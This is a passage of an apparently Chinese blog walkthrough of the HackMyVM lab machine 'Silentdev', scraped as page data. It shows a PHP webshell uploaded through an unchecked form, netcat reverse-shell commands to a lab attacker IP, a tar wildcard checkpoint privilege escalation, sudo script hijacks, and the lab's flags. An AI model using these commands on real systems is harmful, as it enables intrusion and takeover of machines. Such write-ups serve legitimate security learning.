                    document.documentElement.classList.add('dark');

                  console.error('Theme initialization error:', e);

              })();

003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e:25:cc:a4:f5:85:ac:63:c6:13:3e (ECDSA)\n|_  256 58:be:2c:d0:40:af:d5:9c:2a:13:38:82:61:f6:8c:87 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Upload Image\nMAC Address: 08:00:27:1C:EA:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.54 ms 192.168.56.117\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 22.16 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eFileUpload\u003c/h2\u003e\n\u003cp\u003e直接就是一个文件上传功能\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上传一个普通图片后，会给出路径\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试上传 PHP 后缀文件，没想到直接上传成功了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e写一句话木马，通过蚁剑连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003enc 192.168.56.5 1234 -e /bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e我们能发现 \u003ccode\u003ewww-data\u003c/code\u003e 用户拥有 \u003ccode\u003edevelopers\u003c/code\u003e 组权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@silentdev:/var/www/html/uploads$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=33(www-data) gid=33(www-data) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=33(www-data),1004(developers)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查询属于该组的文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@silentdev:/home$ find / -group developers 2\u003e/dev/null\n/opt/project\n/var/backups\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e/opt/project\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@silentdev:/opt/project$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 12      \ndrwxrwx--- 2 developer developers 4096 Apr 19 19:30 .\ndrwxr-xr-x 3 root      root       4096 Apr 19 11:08 ..\n-rw-r--r-- 1 root      root       2030 Apr 19 19:29 index.html\n\nwww-data@silentdev:/opt/project$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nindex.html\n\nwww-data@silentdev:/opt/project$ python3 -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/var/backups\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@silentdev:/var/backups$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\napt.extended_states.0  project.tgz\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e解压出来的是和 project 中一模一样的 \u003ccode\u003eindex\u003c/code\u003e 文件\u003c/p\u003e\n\u003cp\u003e不过能看出来系统上有一个定时任务（Cron Job），它会定期将 \u003ccode\u003e/opt/project\u003c/code\u003e 目录的内容打包压缩成 \u003ccode\u003eproject.tgz\u003c/code\u003e 文件，并存放到 \u003ccode\u003e/var/backups\u003c/code\u003e 目录中\u003c/p\u003e\n\u003cp\u003e上传 \u003ccode\u003epspy\u003c/code\u003e 看一下，果然 \u003ccode\u003e1002\u003c/code\u003e 用户定时会压缩 \u003ccode\u003e/opt/project\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003etar 利用\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e*\u003c/code\u003e 万恶之源\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/bin/sh -c \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e /opt/project \u0026#x26;\u0026#x26; tar -zcf /var/backups/project.tgz *\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ehijack：\u003ca href=\"https://gtfobins.github.io/gtfobins/tar/\"\u003ehttps://gtfobins.github.io/gtfobins/tar/\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e /opt/project\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'nc 192.168.56.5 1235 -e /bin/sh'\u003c/span\u003e \u003e shell.sh\n\u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e +x shell.sh\n\u003cspan class=\"hljs-built_in\"\u003etouch\u003c/span\u003e -- \u003cspan class=\"hljs-string\"\u003e\"--checkpoint=1\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003etouch\u003c/span\u003e -- \u003cspan class=\"hljs-string\"\u003e\"--checkpoint-action=exec=sh shell.sh\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e等待弹 shell 即可，即可拿到 \u003ccode\u003edevelopers\u003c/code\u003e 用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e命令劫持\u003c/h3\u003e\n\u003cp\u003e查看 sudo 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edeveloper@silentdev:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e developer on silentdev:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser developer may run the following commands on silentdev:\n    (alfonso) NOPASSWD: /usr/bin/sysinfo.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edeveloper@silentdev:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /usr/bin/sysinfo.sh \n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Hello \u003cspan class=\"hljs-variable\"\u003e$USER\u003c/span\u003e, checking system status.\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Choose an option:\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"1. Disk usage (df)\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"2. Running processes (ps)\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"3. Exit\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e\"Enter option (1-3): \"\u003c/span\u003e opt\n\n\u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$opt\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e\n        1) action=\u003cspan class=\"hljs-string\"\u003e\"df\"\u003c/span\u003e ;;\n        2) action=\u003cspan class=\"hljs-string\"\u003e\"ps\"\u003c/span\u003e ;;\n        3) \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Goodbye!\"\u003c/span\u003e; \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e ;;\n        *) action=\u003cspan class=\"hljs-string\"\u003e\"echo Invalid option\"\u003c/span\u003e ;;\n\u003cspan class=\"hljs-keyword\"\u003eesac\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e\"Any additional options?: \"\u003c/span\u003e extra\n\n\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$action\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$extra\u003c/span\u003e\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我 TM 直接劫持\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ealfonso@silentdev:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nflag{A89aHFj3830878y3hFJ3h2oH}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003exxxx\u003c/h3\u003e\n\u003cp\u003e查看 sudo 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ealfonso@silentdev:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e alfonso on silentdev:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser alfonso may run the following commands on silentdev:\n    (ALL) NOPASSWD: /usr/bin/silentgets\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ealfonso@silentdev:~$ /usr/bin/silentgets \nEnter the username: root\nroot:x:0:0:root:/root:/bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拉出来检查一下\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e只能说又是命令劫持\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSilentdev/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@silentdev:/home/alfonso# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /root/root.txt \nflag{p7609TNt6a0bGF8HW78BG7eh}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e不如群友 low\u003c/p\u003e","title":"HackMyVM - Silentdev","date":"2025-09-26","updated":"2025-09-26","tags":["HMV","Linux","Hijack","FileUpload"],"categories":"靶机","comments":true,"description":"Silentdev. https://hackmyvm.eu/machines/machine.php?vm=Silentdev Recon PortScan FileUpload 直接就是一个文件上传功能 上传一个普通图片后，会给出路径 尝试上传 PHP 后缀文件，没想到直接上传成功了 写一句话木..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMSilentdev"},"buildId":"w5CAf1BA6WXI2gBvWdfre","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
